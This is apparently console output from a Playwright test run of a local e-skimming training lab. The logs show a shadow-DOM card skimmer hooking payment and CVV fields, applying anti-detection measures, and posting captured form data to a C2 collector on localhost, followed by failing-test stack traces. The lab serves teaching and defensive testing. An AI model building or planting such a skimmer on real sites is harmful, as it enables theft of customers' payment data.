ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_8rq3ibrxv 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_lj6d32goa 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_rdwwf1rf6 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_nw0p3qs3z 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519416_a96t2ye4r 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869519517_li0k3 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869519518_mziy3 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869519518_slxpo 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869519518_mh85g 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869519518_pcoxa 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869519518_xau6x 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869519518_b36x4 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869519519_no8y5 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869519519_plsk9 
  âœ˜  24 [chromium] â€º test/tests/shadow-skimmer.spec.js:104:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should monitor fields across shadow boundaries (8.1s)
  âœ˜  26 [chromium] â€º test/tests/shadow-skimmer.spec.js:249:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should capture data through shadow isolation (8.1s)
ğŸ—ï¸ Testing nested shadow DOM structures...
ğŸ”§ Simulating DevTools opening...
ğŸ”§ DevTools detection test: { heightDifference: [33m280[39m, devToolsDetected: [33mtrue[39m }
ğŸ•µï¸ Stealth measures test: {
  hasStealthMeasures: [33mtrue[39m,
  propertyDescriptorModified: [33mtrue[39m,
  consoleMethodsOverridden: [33mfalse[39m
}
âœ… Stealth measures detected and active
ğŸ‘» Element hiding test: { suspiciousElements: [33m0[39m, hiddenElements: [33m0[39m, totalElements: [33m211[39m }
ğŸ•µï¸ Anti-detection stealth measures test completed
  âœ“  27 [chromium] â€º test/tests/shadow-skimmer.spec.js:335:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should implement anti-detection stealth measures (4.3s)
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ§ª Test Environment: local
ğŸ“ Home Index: http://localhost:3000
ğŸ“ Lab 1 Vulnerable: http://localhost:9001
ğŸ“ Lab 1 C2: http://localhost:9002
ğŸ§ª Test environment: local
ğŸ“ Lab 2 Vulnerable URL: http://localhost:9003
ğŸ“ Lab 2 C2 URL: http://localhost:9004
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522923_jgxuuqbvs 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_0nnx0np0o 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_vn6qo3zmh 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_34sn2ewyy 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_6axlopqzo 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869523026_eqga8 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869523026_6xbsq 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869523026_bekly 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869523027_iw02y 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869523027_i9whj 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869523027_2to0m 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869523027_yk60i 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869523028_dt8pc 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869523028_m3vfk 
ğŸ” Analyzing shadow DOM attack patterns...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ“¤ Testing shadow attack cleanup on page unload...
ğŸ—ï¸ Shadow structure analysis: { shadowHostsCount: [33m5[39m, shadowDepths: [ [33m0[39m, [33m0[39m, [33m1[39m, [33m2[39m, [33m3[39m ], maxDepth: [33m3[39m }
âœ… Nested shadow DOM structure confirmed
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525706_iv0o3jfds 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525706_nzkuny6ay 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525706_96fh31mde 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525707_30ii0lv8l 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525707_zurpad5zx 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869525808_ty38i 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869525809_leftb 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869525809_2jfrj 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869525809_67qrz 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869525809_wgrmz 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869525809_5ofj0 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869525810_gii5c 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869525810_ekwxb 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869525810_3ztmu 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526319_tnfnz9bwb 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526320_56yc3j3a5 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526320_p0x2jyir9 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526320_4a9l7cwz0 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526321_f97hcg3ox 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869526422_b8egk 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869526423_wgb2a 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869526423_ur73i 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869526423_wsfy9 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869526423_u9um1 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869526423_60ich 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869526423_1jplf 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869526424_1srmw 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun 
ğŸ“Š Attack pattern analysis: {
  shadowSkimmerAttack: [33mtrue[39m,
  hasShadowDOMSupport: [33mtrue[39m,
  hasTreeWalker: [33mtrue[39m,
  hasMutationObserver: [33mtrue[39m,
  hasWeakSet: [33mtrue[39m,
  hasSendBeacon: [33mtrue[39m,
  shadowRootsDetected: [33m0[39m,
  closedShadowRootsLikely: [33m199[39m
}
ğŸ‘» Shadow attack status: {
  active: [33mtrue[39m,
  shadowHosts: [33m5[39m,
  capturedSessions: [33m9[39m,
  monitoringIntervals: [33m3[39m
}
âœ… Shadow DOM attack patterns verified
  âœ“  29 [chromium] â€º test/tests/shadow-skimmer.spec.js:503:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should contain shadow DOM attack patterns (4.7s)
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_input_card-number_cardNumber_text_1762869526422_b8egk 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_input_card-number_cardNumber_text_1762869526422_b8egk 
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun","elementInfo":{"tagName":"FORM","name":"add-card-form"},"capturedEvents":[{"timestamp":1762869527915,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869527915,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1544}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869527968,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
ğŸŒ REQUEST TO C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  method: [32m'POST'[39m,
  headers: {
    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
    referer: [32m'http://localhost:9003/'[39m,
    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
    [32m'content-type'[39m: [32m'application/json'[39m,
    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
    [32m'accept-language'[39m: [32m'en-US'[39m
  },
  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_input_card-number_cardNumber_text_1762869526422_b8egk","elementInfo":{"tagName":"INPUT","type":"text","name":"cardNumber"},"capturedEvents":[{"timestamp":1762869527915,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869527915,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1555}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869527977,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
}
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-foXYsJedjC/djAXW4og+HV7P7QU"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:48 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
ğŸ“¥ RESPONSE FROM C2: {
  url: [32m'http://localhost:9004/collect'[39m,
  status: [33m200[39m,
  headers: {
    etag: [32m'W/"85-Qu8jjHZbyrshOz/ZC7wccD5NNoA"'[39m,
    connection: [32m'keep-alive'[39m,
    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
    [32m'content-length'[39m: [32m'133'[39m,
    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
    date: [32m'Tue, 11 Nov 2025 13:58:48 GMT'[39m,
    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
    [32m'x-powered-by'[39m: [32m'Express'[39m
  }
}
ğŸ‘» SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
  âœ˜  28 [chromium] â€º test/tests/shadow-skimmer.spec.js:442:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle nested shadow DOM structures (8.1s)
  âœ˜  30 [chromium] â€º test/tests/shadow-skimmer.spec.js:568:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle page unload with shadow cleanup (8.1s)


  1) [chromium] â€º test/tests/cc-exfiltration.spec.js:39:3 â€º Lab 2: DOM-Based Skimming - Credit Card Exfiltration â€º should enter CC information and verify C2 server shows exfiltrated data 

    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoBeGreaterThan[2m([22m[32mexpected[39m[2m)[22m

    [1mMatcher error[22m: [31mreceived[39m value must be a number or bigint

    Received has value: [31mundefined[39m

      74 |
      75 |     // Verify attack was recorded
    > 76 |     expect(stats.totalAttacks).toBeGreaterThan(0)
         |                                ^
      77 |     console.log('âœ… Attack recorded in C2 server')
      78 |
      79 |     // Get recent attacks to verify our data
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/cc-exfiltration.spec.js:76:32

    Error Context: test-results/tests-cc-exfiltration-Lab--62ada-rver-shows-exfiltrated-data-chromium/error-context.md

  2) [chromium] â€º test/tests/dom-monitor.spec.js:49:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should monitor DOM mutations and attach to new forms 

    ReferenceError: request is not defined

      37 |
      38 |     page.on('response', response => {
    > 39 |       if (request.url().includes('/collect')) {
         |       ^
      40 |         console.log('ğŸ“¥ RESPONSE FROM C2:', {
      41 |           url: response.url(),
      42 |           status: response.status(),
        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)

    Error: page.waitForLoadState: Test ended.

      52 |     // Load banking page
      53 |     await page.goto(`${lab2VulnerableUrl}/banking.html`)
    > 54 |     await page.waitForLoadState('networkidle')
         |                ^
      55 |
      56 |     // Inject DOM monitor attack
      57 |     await page.addScriptTag({
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:54:16

    Error Context: test-results/tests-dom-monitor-DOM-Base-fadfd-ons-and-attach-to-new-forms-chromium/error-context.md

  3) [chromium] â€º test/tests/dom-monitor.spec.js:109:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should capture keystrokes in real-time 

    ReferenceError: request is not defined

      37 |
      38 |     page.on('response', response => {
    > 39 |       if (request.url().includes('/collect')) {
         |       ^
      40 |         console.log('ğŸ“¥ RESPONSE FROM C2:', {
      41 |           url: response.url(),
      42 |           status: response.status(),
        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)

    Error: page.addScriptTag: Test ended.

      113 |
      114 |     // Inject DOM monitor attack
    > 115 |     await page.addScriptTag({
          |     ^
      116 |       path: './malicious-code/dom-monitor.js'
      117 |     })
      118 |
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:115:5

    Error Context: test-results/tests-dom-monitor-DOM-Base-b2c93-ure-keystrokes-in-real-time-chromium/error-context.md

  4) [chromium] â€º test/tests/dom-monitor.spec.js:174:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should detect and monitor dynamically added forms 

    ReferenceError: request is not defined

      37 |
      38 |     page.on('response', response => {
